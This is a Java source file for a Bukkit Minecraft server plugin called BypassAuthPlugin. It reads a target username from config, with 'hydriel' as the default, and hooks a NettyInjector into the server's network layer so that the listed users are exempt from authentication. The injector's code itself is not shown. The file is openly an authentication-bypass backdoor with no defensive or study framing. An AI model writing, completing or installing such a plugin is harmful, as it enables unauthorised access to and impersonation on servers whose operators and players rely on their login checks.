package com.example.bypass;

import org.bukkit.plugin.java.JavaPlugin;
import java.util.HashSet;
import java.util.Set;

public class BypassAuthPlugin extends JavaPlugin {

    private final Set<String> bypassedUsers = new HashSet<>();
    private NettyInjector injector;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        bypassedUsers.add(getConfig().getString("target-user", "hydriel").toLowerCase());
        
        injector = new NettyInjector(this);
        injector.inject();
        
        getLogger().info("BypassAuth enabled for users: " + bypassedUsers);
    }

    @Override
    public void onDisable() {
        if (injector != null) {
            injector.uninject();
        }
    }

    public boolean isBypassed(String username) {
        return bypassedUsers.contains(username.toLowerCase());
    }
}
